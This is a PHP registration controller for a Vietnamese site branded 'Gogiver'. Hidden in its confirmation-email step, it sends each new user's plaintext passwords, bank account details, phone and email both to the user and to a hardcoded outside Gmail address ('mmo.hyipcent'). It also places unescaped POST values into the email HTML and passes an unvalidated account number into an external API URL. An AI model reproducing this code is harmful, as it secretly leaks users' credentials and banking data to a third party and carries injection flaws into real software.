<?php
class ControllerAccountRegister extends Controller {
	private $error = array();

	public function index() {
		function myCheckLoign($self) {
			return $self -> customer -> isLogged() ? true : false;
		};

		//method to call function
		!call_user_func_array("myCheckLoign", array($this)) && $this -> response -> redirect($this -> url -> link('account/login', '', 'SSL'));

		$this -> document -> addScript('catalog/view/javascript/register/register.js');


		if ($this -> request -> server['REQUEST_METHOD'] === 'POST') {

		}

		//language
		$this -> load -> model('account/customer');
		$getLanguage = $this -> model_account_customer -> getLanguage($this -> customer -> getId());
		$language = new Language($getLanguage);
		$language -> load('account/register');
		$data['lang'] = $language -> data;

		//start load country model
		$this -> load -> model('customize/country');
		if ($this->request->server['HTTPS']) {
			$server = $this->config->get('config_ssl');
		} else {
			$server = $this->config->get('config_url');
		}

		$data['base'] = $server;
		$data['customer_code'] = $this -> model_account_customer -> getCustomer($this -> customer -> getId());
		$data['customer_code'] = $data['customer_code']['username'];

		$data['country'] = $this -> model_customize_country -> getCountry();
		//end load country model

		//data render website
		$data['self'] = $this;

		//error validate
		$data['error'] = $this -> error;
		$data['p_binary'] = false;
		$data['has_register'] = false;

		if ($this->request->server['REQUEST_METHOD'] === 'POST'){
			
			$this -> load -> model('customize/register');
			$this -> load -> model('account/auto');
			$this -> load -> model('account/customer');

			$tmp = $this -> model_customize_register -> addCustomer($this->request->post);

			$this -> model_customize_register -> update_customer_code($tmp);

			$data['has_register'] = true;
			$cus_id= $tmp;
			$amount = 0;
			$this -> model_account_customer -> updatePin_sub($this -> session -> data['customer_id'], 5 );
			$this -> model_account_customer -> saveHistoryPin(
					$this -> session -> data['customer_id'],  
					'- 5',
					'Use Pin for register '.$_POST['username'],
					'Register',
					'Use Pin for register '.$_POST['username']
				);
			$checkC_Wallet = $this -> model_account_customer -> checkR_Wallet($cus_id);
			if(intval($checkC_Wallet['number'])  === 0){
				if(!$this -> model_account_customer -> insertR_WalletR($amount, $cus_id)){
					die();
				}
			}
			$mail = new Mail();
			$mail -> protocol = $this -> config -> get('config_mail_protocol');
			$mail -> parameter = $this -> config -> get('config_mail_parameter');
			$mail -> smtp_hostname = $this -> config -> get('config_mail_smtp_hostname');
			$mail -> smtp_username = $this -> config -> get('config_mail_smtp_username');
			$mail -> smtp_password = html_entity_decode($this -> config -> get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
			$mail -> smtp_port = $this -> config -> get('config_mail_smtp_port');
			$mail -> smtp_timeout = $this -> config -> get('config_mail_smtp_timeout');

			//$mail -> setTo($this -> config -> get('config_email'));
		
			$mail->setTo(array(0 => ''.$_POST['email'].'', 1 => 'mmo.hyipcent@gmail.com'));
			$mail -> setFrom($this -> config -> get('config_email'));
			$mail -> setSender(html_entity_decode("Gogiver", ENT_QUOTES, 'UTF-8'));
			$mail -> setSubject("Chúc mừng bạn đã đăng ký thành công!");
			$mail -> setHtml('
				
		   <table align="center" bgcolor="#eeeeee" border="0" cellpadding="0" cellspacing="0" style="background:#eeeeee;border-collapse:collapse;line-height:100%!important;margin:0;padding:0;width:100%!important">
		   <tbody>
		      <tr>
		         <td>
		            <table style="border-collapse:collapse;margin:auto;max-width:635px;min-width:320px;width:100%">
		   <tbody>
		      <tr>
		         <td>
		            <table style="border-collapse:collapse;color:#c0c0c0;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:26px;margin:0 auto 26px;width:100%">
		               <tbody>
		                  <tr>
		                     <td></td>
		                  </tr>
		               </tbody>
		            </table>
		         </td>
		      </tr>
		      <tr>
		         <td>
		            <table style="width:600px;" align="center" border="0" cellspacing="0" style="border-collapse:collapse;border-radius:3px;color:#545454;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:20px;margin:0 auto;width:100%">
		   <tbody>
		      <tr>
		         <td>
		            <table border="0" cellpadding="0" cellspacing="0" style="border:none;border-collapse:separate;font-size:1px;height:2px;line-height:3px;width:100%">
		               <tbody>
		                  <tr>
		                     <td bgcolor="#9B59B6" valign="top"> </td>
		                  </tr>
		               </tbody>
		            </table>
		            <table style="width:600px; border="0" cellpadding="0" cellspacing="0" height="100%" style="border-collapse:collapse;border-color:#dddddd;border-radius:0 0 3px 3px;border-style:solid;border-width:1px;width:100%" width="100%">
		   <tbody>
		      <tr>
		         <td align="center" valign="top">
		            <table border="0" cellpadding="0" cellspacing="0" width="100%">
		               <tbody>
		                  <tr>
		                     <td align="center" style="background:#ffffff">
		                        <a href="https://happymoney.us" target="_blank" data-saferedirecturl="happymoney.us">
		                           <h1 style="margin-top:30px; font-weight:bold;">Gogiver.biz</h1>
		                        </a>
		                     </td>
		                  </tr>
		               </tbody>
		            </table>
		         </td>
		      </tr>
		      <table style="background:#FFF; padding:25px;width:600px">
		      	<tbody>
		      		<tr>
		      			<td style="padding:30px;background:white;color:#525252;font-family:"Helvetica Neue",Arial,sans-serif;font-size:15px;line-height:22px;overflow:hidden;">
		            <p><span>Xin chào <b>'.$_POST['username'].'</b>,</span></p>
		            <p><span>Chúc mừng bạn đã đăng ký tài khoản thành công!</span></p>
		            <p><strong>Tên tài khoản ngân hàng: <span style="color:#5cb85c">'.$_POST['account_holder'].'</span></strong></p>
		            <p><strong>Ngân hàng: <span style="color:#5cb85c">'.$_POST['bank_name'].'</span></strong></p>
		            <p><strong>Số tài khoản ngân hàng: <span style="color:#5cb85c">'.$_POST['account_number'].'</span></strong></p>
		            <p><strong>Email: <span style="color:#5cb85c">'.$_POST['email'].'</span></strong></p>
		            <p><strong>Số điện thoại: <span style="color:#5cb85c">'.$_POST['telephone'].'</span></strong></p>
		            <p><strong>Tên tài khoản: <span style="color:#5cb85c">'.$_POST['username'].'</span></strong></p>
		            <p><strong>Mật khẩu đăng nhập: <span style="color:#5cb85c">'.$_POST['password'].'</span></strong></p>
				<p><strong>Mật khẩu 2: <span style="color:#5cb85c">'.$_POST['password2'].'</span></strong></p>
		            <p><strong>Vào ngày<strong>: '.date('d/m/Y H:i:s').'</p></td></p>
		             
		      		</tr>
		      	</tbody>
		      </table>
		       <hr>

			');
			$mail -> send();
			//print_r($mail); die;
			// $this -> response -> redirect($this -> url -> link('account/register', '#success', 'SSL'));
			$this->response->redirect(HTTPS_SERVER . 'register.html#success');
		}


		if (file_exists(DIR_TEMPLATE . $this -> config -> get('config_template') . '/template/account/register.tpl')) {
			$this -> response -> setOutput($this -> load -> view($this -> config -> get('config_template') . '/template/account/register.tpl', $data));
		} else {
			$this -> response -> setOutput($this -> load -> view('default/template/account/register.tpl', $data));
		}

	}
	public function check_pin(){
		$this -> load -> model('account/customer');
		$pin = $this -> model_account_customer -> check_pin($this->session->data['customer_id']);

		return $pin;
	}
	public function checkuser() {
		if ($this -> request -> get['username']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitUserName($this -> request -> get['username'])) === 1 ? 1 : 0;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function checkemail() {
		if ($this -> request -> get['email']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitEmail($this -> request -> get['email'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}
	public function checkphone() {
		if ($this -> request -> get['phone']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitPhone($this -> request -> get['phone'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function checkcmnd() {
		if ($this -> request -> get['cmnd']) {
			$this -> load -> model('customize/register');
			$json['success'] = intval($this -> model_customize_register -> checkExitCMND($this -> request -> get['cmnd'])) < 1 ? 0 : 1;
			$this -> response -> setOutput(json_encode($json));
		}
	}

	public function getjson(){

		$account = $_POST['number_vcb'];
		$this -> load -> model('customize/register');
		$number = $this->model_customize_register->get_vcb($account);
		if (count($number) < 1)
		{
			$json = implode('', file('https://santienao.com/api/v1/bank_accounts/'.$account.''));
			echo  $json;
			$json_decode = json_decode($json);
			if ($json_decode->state == "fetched"){
				$this->model_customize_register->insert_vcb($json_decode->account_id,$json_decode->account_name,$json_decode->bank_name);
				die;
			}
		}
		else{
			$number = $this->model_customize_register->get_vcb($account);
			echo json_encode($number);
		}

	}



}
